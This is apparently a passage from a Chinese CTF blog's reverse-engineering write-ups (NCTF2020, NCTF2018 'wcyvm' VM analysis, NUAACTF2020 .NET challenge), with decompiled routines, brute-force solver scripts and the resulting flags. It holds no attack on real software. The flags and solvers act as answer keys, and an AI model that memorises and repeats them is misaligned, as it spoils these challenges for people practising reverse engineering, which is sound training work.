class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_55EC99F53290</span><span class="params">(<span class="type">unsigned</span> __int8 *a1, <span class="type">char</span> *a2, _BYTE *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v4; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// r10</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r11d</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v7; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// ebp</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v9; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">char</span> v11; <span class="comment">// si</span></span><br><span class="line">  <span class="type">char</span> v12; <span class="comment">// di</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// al</span></span><br><span class="line">  <span class="type">char</span> v14; <span class="comment">// si</span></span><br><span class="line">  <span class="type">char</span> v15; <span class="comment">// r8</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = (<span class="type">unsigned</span> __int8)a2[<span class="number">3</span>];                  <span class="comment">// v3=0x75</span></span><br><span class="line">  v4 = a1[<span class="number">3</span>];</span><br><span class="line">  v5 = *a2;                                     <span class="comment">// v5=0x7E</span></span><br><span class="line">  v6 = *a1;</span><br><span class="line">  v7 = a1[<span class="number">1</span>];</span><br><span class="line">  v8 = (<span class="type">unsigned</span> __int8)a2[<span class="number">1</span>];                  <span class="comment">// v8=0x1F</span></span><br><span class="line">  v9 = a1[<span class="number">2</span>];</span><br><span class="line">  v10 = (v6 + v4) * (*a2 + v3);                 <span class="comment">// a2[0]=0x7E</span></span><br><span class="line">  v11 = a2[<span class="number">2</span>];</span><br><span class="line">  v12 = v3 * (v6 + v7);</span><br><span class="line">  v13 = (v3 + v11) * (v7 - v4);</span><br><span class="line">  v14 = v4 * (v11 - v5);</span><br><span class="line">  v15 = v5 * (v9 + v4);</span><br><span class="line">  *a3 = v14 + v10 + v13 - v12;</span><br><span class="line">  a3[<span class="number">2</span>] = v15 + v14;</span><br><span class="line">  result = (<span class="type">unsigned</span> <span class="type">int</span>)(v6 * (v8 - v3));</span><br><span class="line">  a3[<span class="number">1</span>] = v6 * (v8 - v3) + v12;</span><br><span class="line">  a3[<span class="number">3</span>] = v6 * (v8 - v3) + (v8 + v5) * (v9 - v6) + v10 - v15;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>动调发现逻辑就是取四个字符一组进行加密处理 直接枚举爆破</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">enc</span><span class="params">(<span class="type">unsigned</span> __int8 *a1,<span class="type">unsigned</span> <span class="type">char</span> *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v4; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// r10</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r11d</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v7; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// ebp</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v9; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">char</span> v11; <span class="comment">// si</span></span><br><span class="line">  <span class="type">char</span> v12; <span class="comment">// di</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// al</span></span><br><span class="line">  <span class="type">char</span> v14; <span class="comment">// si</span></span><br><span class="line">  <span class="type">char</span> v15; <span class="comment">// r8</span></span><br><span class="line"></span><br><span class="line">v3=<span class="number">0x75</span>;</span><br><span class="line">  v4 = a1[<span class="number">3</span>];</span><br><span class="line">v5=<span class="number">0x7E</span>;</span><br><span class="line">  v6 = *a1;</span><br><span class="line">  v7 = a1[<span class="number">1</span>];</span><br><span class="line">v8=<span class="number">0x1F</span>;</span><br><span class="line">  v9 = a1[<span class="number">2</span>];</span><br><span class="line">  v10 = (v6 + v4) * (<span class="number">0x7E</span> + <span class="number">0x75</span>);                 <span class="comment">// a2[0]=0x7E</span></span><br><span class="line">  v11 = <span class="number">0x19</span>;</span><br><span class="line">  v12 = <span class="number">0x75</span> * (v6 + v7);</span><br><span class="line">  v13 = (<span class="number">0x75</span> + <span class="number">0x19</span>) * (v7 - v4);</span><br><span class="line">  v14 = v4 * (<span class="number">0x19</span> - <span class="number">0x7E</span>);</span><br><span class="line">  v15 = <span class="number">0x7E</span> * (v9 + v4);</span><br><span class="line">  a3[<span class="number">0</span>] = v14 + v10 + v13 - v12;</span><br><span class="line">  a3[<span class="number">2</span>] = v15 + v14;</span><br><span class="line">  a3[<span class="number">1</span>] = v6 * (<span class="number">0x1F</span> - <span class="number">0X75</span>) + v12;</span><br><span class="line">  a3[<span class="number">3</span>] = v6 * (<span class="number">0x1F</span> - <span class="number">0x75</span>) + (<span class="number">0x1f</span> + <span class="number">0x7e</span>) * (v9 - v6) + v10 - v15;</span><br><span class="line">a3[<span class="number">0</span>]&amp;=<span class="number">0xff</span>;</span><br><span class="line">a3[<span class="number">1</span>]&amp;=<span class="number">0xff</span>;</span><br><span class="line">a3[<span class="number">2</span>]&amp;=<span class="number">0xff</span>;</span><br><span class="line">a3[<span class="number">3</span>]&amp;=<span class="number">0xff</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> a1[<span class="number">4</span>],a3[<span class="number">4</span>];</span><br><span class="line"><span class="type">int</span> c1[]=&#123;<span class="number">122</span>,<span class="number">173</span>,<span class="number">239</span>,<span class="number">153</span>,<span class="number">5</span>,<span class="number">109</span>,<span class="number">118</span>,<span class="number">172</span>,<span class="number">117</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> c2[]=&#123;</span><br><span class="line"><span class="number">8</span>,<span class="number">175</span>,<span class="number">216</span>,<span class="number">235</span>,<span class="number">67</span>,<span class="number">10</span>,<span class="number">100</span>,<span class="number">242</span>,<span class="number">117</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> c3[]=&#123;</span><br><span class="line"><span class="number">46</span>,<span class="number">130</span>,<span class="number">13</span>,<span class="number">42</span>,<span class="number">159</span>,<span class="number">127</span>,<span class="number">47</span>,<span class="number">201</span>,<span class="number">181</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> c4[]=&#123;</span><br><span class="line"><span class="number">186</span>,<span class="number">140</span>,<span class="number">248</span>,<span class="number">22</span>,<span class="number">200</span>,<span class="number">190</span>,<span class="number">169</span>,<span class="number">71</span>,<span class="number">51</span></span><br><span class="line">&#125;;</span><br><span class="line">string flag=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> _=<span class="number">0</span>;_&lt;<span class="number">9</span>;_++)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> a=<span class="number">32</span>;a&lt;=<span class="number">128</span>;a++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//cout&lt;&lt;a&lt;&lt;&quot;\n&quot;;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> b=<span class="number">32</span>;b&lt;=<span class="number">128</span>;b++)</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> c=<span class="number">32</span>;c&lt;=<span class="number">128</span>;c++)</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> d=<span class="number">32</span>;d&lt;=<span class="number">128</span>;d++)</span><br><span class="line">&#123;</span><br><span class="line">a1[<span class="number">0</span>]=a,a1[<span class="number">1</span>]=b,a1[<span class="number">2</span>]=c,a1[<span class="number">3</span>]=d;</span><br><span class="line"><span class="built_in">enc</span>(a1,a3);</span><br><span class="line"><span class="keyword">if</span>(a3[<span class="number">0</span>]==c1[_]&amp;&amp;a3[<span class="number">1</span>]==c2[_]&amp;&amp;a3[<span class="number">2</span>]==c3[_]&amp;&amp;a3[<span class="number">3</span>]==c4[_])&#123;</span><br><span class="line">cout&lt;&lt;<span class="built_in">char</span>(a)&lt;&lt;<span class="string">&quot;&quot;</span>&lt;&lt;<span class="built_in">char</span>(b)&lt;&lt;<span class="string">&quot;&quot;</span>&lt;&lt;<span class="built_in">char</span>(c)&lt;&lt;<span class="string">&quot;&quot;</span>&lt;&lt;<span class="built_in">char</span>(d)&lt;&lt;<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>flag</strong> : NCTF{f6dffab6-173f-4bb1-a973-62f3f8254eba}</p><h2 id="just-run-it"><a href="#just-run-it" class="headerlink" title="just_run_it"></a>just_run_it</h2><p>神奇的cosmopolitan Linux Windows都能跑<br>找到关键函数 先输一个16的key 再输flag<br>输入的key做了一个乱序的映射 可以通过动调找到对应关系</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">428100: 1234567890abcdef</span><br><span class="line">428180: 1267358c49bd0aef</span><br></pre></td></tr></table></figure><p>key的逻辑是先乱序一道 然后作了个xor 再乱序一道 然后与unk_425180 check<br>对应还原 得到<br><code>W1lc0menctf2o2o!</code></p><p>然后后面的加密发现sbox Google常量发现是sm4<br>找到enc值 <a href="https://the-x.cn/zh-cn/cryptography/Sm4.aspx">在线网站</a> 解就完了</p><p><strong>NCTF{b23a271e-2b15-4bb5-9719-738cffb83919}</strong></p><h1 id="NCTF2018"><a href="#NCTF2018" class="headerlink" title="NCTF2018"></a>NCTF2018</h1><h2 id="wcyvm"><a href="#wcyvm" class="headerlink" title="wcyvm"></a>wcyvm</h2><p>一道虚拟机opcode的题<br>逆出flag不难(事实上 意外的简单…) 但是整体opcode有些点还是需要仔细琢磨的<br>在之前做的几道基础上增加了一点寻址方式的考察</p><p>逐个分析:<br>case 0x8<br>寄存器赋值<br>case 0x9<br>这里没怎么搞懂</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sub_40096D</span>(v4[*(_DWORD *)(v5[<span class="number">0</span>] + <span class="number">4</span>) - <span class="number">1</span>], &amp;v4[<span class="number">4</span>], v5);</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_QWORD *__fastcall <span class="title">sub_40096D</span><span class="params">(_DWORD *a1, _DWORD **a2, _QWORD *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  *a1 = *(*a2)++;</span><br><span class="line">  result = a3;</span><br><span class="line">  *a3 += <span class="number">8LL</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结合case 0xa的类似代码 我是把这里归为类似push&#x2F;pop 这种堆栈操作</p><p>case 0xa</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sub_400927</span>(v4[*(_DWORD *)(v5[<span class="number">0</span>] + <span class="number">4</span>) - <span class="number">1</span>], &amp;v4[<span class="number">4</span>], v5);</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_QWORD *__fastcall <span class="title">sub_400927</span><span class="params">(_DWORD *a1, _QWORD *a2, _QWORD *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  *a2 -= <span class="number">4LL</span>;</span><br><span class="line">  *(_DWORD *)*a2 = *a1;</span><br><span class="line">  result = a3;</span><br><span class="line">  *a3 += <span class="number">8LL</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>case 0xb<br>getchar<br>case 0xc<br>putchar<br>case 0xd<br>cmp 只是这里置标志位的方法比较独特 结合后面je&#x2F;jne分析其实跟正常置0&#x2F;1作用是一样的<br>case 0xe<br>jmp<br>case 0xf<br>jne<br>case 0x10<br>je<br>case 0x11<br>inc<br>case 0x12<br>dec<br>case 0x13<br>add<br>case 0x14<br>sub<br>case 0x15<br>xor<br>case 0x16<br>and<br>case 0x17<br>or<br>case 0x19 ~ case 0x1c<br>四种不同的赋值(变量类型不同)<br>case 0x1d<br>mul<br>case 0x64<br>check_flag</p><p>这么处理 打印出来的字节码就是这种:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">0 mov v4[0] 0</span><br><span class="line">3 mov v4[2] 70</span><br><span class="line">6 jmp 13</span><br><span class="line">8 push v4[0]</span><br><span class="line">10 pop v4[1]</span><br><span class="line">12 mov v4[0] getchar()</span><br><span class="line">13 push v4[0]</span><br><span class="line">15 push v4[1]</span><br><span class="line">17 pop v4[0]</span><br><span class="line">19 inc v4[0]</span><br><span class="line">21 cmp v4[0] v4[2]</span><br><span class="line">24 jne 8</span><br><span class="line">26 mov v4[0] 0</span><br><span class="line">29 mov v4[2] 71</span><br><span class="line">32 jmp 13</span><br><span class="line">34 push v4[0]</span><br><span class="line">36 mov v4[1] v4[5]</span><br><span class="line">39 mul v4[0] 4</span><br><span class="line">42 sub v4[1] v4[0]</span><br><span class="line">45 mov v4[0] v4[1]</span><br><span class="line">48 mov v4[0] v4[0]</span><br><span class="line">51 mul v4[0] 110</span><br><span class="line">54 add v4[0] 99</span><br><span class="line">57 xor v4[0] 116</span><br><span class="line">60 add v4[0] 102</span><br><span class="line">63 mov v4[1] v4[0]</span><br><span class="line">66 pop v4[0]</span><br><span class="line">68 inc v4[0]</span><br><span class="line">70 cmp v4[0] v4[2]</span><br><span class="line">73 jne 34</span><br><span class="line">75 check_flag</span><br></pre></td></tr></table></figure><p>可以发现 有几个点真的很奇怪 但是对于input的变换一眼就能看出来…<br>同时 在check_flag中能找到对应的enc[] 爆破解就完了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="number">0x000036D3</span>, <span class="number">0x00002AFF</span>, <span class="number">0x00002ACB</span>, <span class="number">0x00002B95</span>, <span class="number">0x00002B95</span>, <span class="number">0x00002B95</span>, <span class="number">0x0000169F</span>, <span class="number">0x0000186D</span>, <span class="number">0x000018D7</span>, <span class="number">0x00001611</span>, <span class="number">0x000018D7</span>, <span class="number">0x00002B95</span>, <span class="number">0x00002C23</span>, <span class="number">0x00002CA9</span>, <span class="number">0x00001611</span>, <span class="number">0x00001611</span>, <span class="number">0x000018D7</span>, <span class="number">0x00002AFF</span>, <span class="number">0x00001849</span>, <span class="number">0x000018FB</span>, <span class="number">0x00002ACB</span>, <span class="number">0x00002A71</span>, <span class="number">0x00001735</span>, <span class="number">0x000018D7</span>, <span class="number">0x00001611</span>, <span class="number">0x00002ACB</span>, <span class="number">0x000015DD</span>, <span class="number">0x000018D7</span>, <span class="number">0x00002C23</span>, <span class="number">0x0000169F</span>, <span class="number">0x000015DD</span>, <span class="number">0x00002B95</span>, <span class="number">0x0000169F</span>, <span class="number">0x0000156B</span>, <span class="number">0x0000186D</span>, <span class="number">0x00002AFF</span>, <span class="number">0x00001611</span>, <span class="number">0x00001611</span>, <span class="number">0x000015DD</span>, <span class="number">0x00002AFF</span>, <span class="number">0x00002C23</span>, <span class="number">0x00002ACB</span>, <span class="number">0x000015DD</span>, <span class="number">0x000015DD</span>, <span class="number">0x0000186D</span>, <span class="number">0x00001849</span>, <span class="number">0x00002B95</span>, <span class="number">0x0000156B</span>, <span class="number">0x00001735</span>, <span class="number">0x000018FB</span>, <span class="number">0x000018FB</span>, <span class="number">0x00002A71</span>, <span class="number">0x00002AFF</span>, <span class="number">0x00001735</span>, <span class="number">0x00002C23</span>, <span class="number">0x000015DD</span>, <span class="number">0x000018D7</span>, <span class="number">0x00002A71</span>, <span class="number">0x000018D7</span>, <span class="number">0x000018D7</span>, <span class="number">0x00002C23</span>, <span class="number">0x00002AFF</span>, <span class="number">0x0000156B</span>, <span class="number">0x00002C23</span>, <span class="number">0x0000169F</span>, <span class="number">0x000035AF</span>, <span class="number">0x00002CA9</span>, <span class="number">0x000032B5</span>, <span class="number">0x00002AFF</span>, <span class="number">0x00003039</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="keyword">if</span>(c==<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        y = (<span class="number">110</span>*x+<span class="number">99</span>)^<span class="number">116</span></span><br><span class="line">        y += <span class="number">102</span></span><br><span class="line">        <span class="keyword">if</span>(y==c):</span><br><span class="line">            flag += <span class="built_in">chr</span>(x)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(flag[::-<span class="number">1</span>])</span><br><span class="line"><span class="comment"># nctf&#123;3e1ce77b70e4cb9941d6800aec022c813d03e70a274ba96c722fed72783dddac&#125;</span></span><br></pre></td></tr></table></figure><p>flag:<br><strong>nctf{3e1ce77b70e4cb9941d6800aec022c813d03e70a274ba96c722fed72783dddac}</strong></p><hr><hr><p>至于为什么倒序 其实字节码可以看出来<br>这里:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">36 mov v4[1] v4[5]</span><br><span class="line">39 mul v4[0] 4</span><br><span class="line">42 sub v4[1] v4[0]</span><br><span class="line">45 mov v4[0] v4[1]</span><br><span class="line">48 mov v4[0] v4[0]</span><br></pre></td></tr></table></figure><p>这里的v4[5]就是我们input放入的栈的栈顶指针<br>可以看到这里是 sub v4[1] v4[0] 所以是从栈顶取的 也就是入栈顺序倒序<br>48处那个看似没用的语句是将v4[0]地址对应的值赋给v4[0] 相当于取地址<br>这就是前面那4个变量类型不同的赋值</p><p>最后 得到flag又去看了看其他师傅的写法 对那四个赋值区别有了更深了解<br>0x19:<br>直接赋值 mov a1 a2</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_QWORD *__fastcall <span class="title">sub_400858</span><span class="params">(_DWORD *a1, _DWORD *a2, _QWORD *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  *a1 = *a2;</span><br><span class="line">  result = a3;</span><br><span class="line">  *a3 += <span class="number">12LL</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>0x1a:<br>取a2的地址给a1 lea a1 a2</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_QWORD *__fastcall <span class="title">sub_400889</span><span class="params">(_DWORD *a1, <span class="type">int</span> a2, _QWORD *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  *a1 = a2;</span><br><span class="line">  result = a3;</span><br><span class="line">  *a3 += <span class="number">12LL</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>0x1b:<br>寄存器间接寻址 mov a1 [a2]</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_QWORD *__fastcall <span class="title">sub_4008BA</span><span class="params">(_DWORD *a1, <span class="type">unsigned</span> <span class="type">int</span> *a2, _QWORD *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  *a1 = *(_DWORD *)*a2;</span><br><span class="line">  result = a3;</span><br><span class="line">  *a3 += <span class="number">12LL</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>0x1c:<br>mov [a1] a2</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_QWORD *__fastcall <span class="title">sub_4008EF</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a1, _DWORD *a2, _QWORD *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  *(_DWORD *)*a1 = *a2;</span><br><span class="line">  result = a3;</span><br><span class="line">  *a3 += <span class="number">12LL</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽说字节码还是有点怪 但是理解opcode本质后 题目的训练目的就达到了</p><h1 id="NUAACTF2020"><a href="#NUAACTF2020" class="headerlink" title="NUAACTF2020"></a>NUAACTF2020</h1><h2 id="demium"><a href="#demium" class="headerlink" title="demium"></a>demium</h2><p>32位.NET<br>dnspy找半天找不到关键函数 搁着就没找到入口点…<br>瞎翻函数列表 翻到个 internal unsafe static void EncryptStr(char* input)</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span 